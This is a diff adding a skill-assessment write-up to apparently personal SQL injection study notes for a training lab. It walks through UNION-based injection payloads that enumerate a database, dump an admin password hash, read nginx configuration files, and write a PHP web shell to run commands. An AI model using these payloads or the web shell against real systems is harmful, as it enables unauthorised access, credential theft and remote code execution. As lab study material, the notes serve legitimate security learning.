@@ -419,3 +419,43 @@ With this we can browse shell.php and execute commands via 0 parameter, e.g. ?0=
 * Parameterized Queries or Prepared Statements
 	* [mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php)
 
+# Skill Assessment
+
+At first i started trying SQL Injections on the login form (with SQLmap) and saw that this might be a dead end. So i went over to the Create Account form, where the invitation code seems to be vulnerable:
+With following Payload i was successfully able to create an account:
+`username=username&password=h4rdtoguess%21&repeatPassword=h4rdtoguess%21&invitationCode=abcd-efgh-1234`
+
+After some searching i found, that the q paramter over the search is vulnerable as well (500 status code on single quote). This is the point which helps us to answer the questions.
+After some payload testing with UNIONs i found following working payload:
+```sql
+') UNION SELECT 1,2,3,4-- -
+```
+With this i know that we need 4 columns for our UNION payload and that 3 and 4 are displayed.
+With this i was able to enumerate 
+
+```mysql
+') UNION SELECT 1,2,database(),4-- -
+```
+This shows, that the current database is chattr.
+Now we can take a look at its tables:
+```mysql
+)' UNION select 1,2, TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='chattr'-- -
+```
+We find the Tables Users, Invitation Codes and Messages. Now we only need to figure out the columns:
+```mysql
+' UNION select 1,2,TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='User'-- -
+```
+We find the table Password. We are now able to find the hash:
+```mysql
+') UNION SELECT 1,2,Password,4 FROM Users WHERE Username='admin'-- -
+```
+To find out the root directory, i first take a look at the Server Response header, telling me that this is a nginx. Hence i load following Config files:
+```mysql
+') UNION SELECT 1,2,3, LOAD_FILE("/etc/nginx/nginx.conf")-- -
+') UNION SELECT 1,2,3, LOAD_FILE("/etc/nginx/sites-enabled/default")-- -
+```
+The base dir is /var/www/chattr-prod. With this we are able to write files (i did not bother to check the permissions as the task basically tells me that we are allowed to write files)
+```mysql
+)' UNION SELECT "", "", "" ,'<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -
+```
+With this I am able to browse our web sell with `.../shell?0=ls` and thus I found the flag in the root directory.
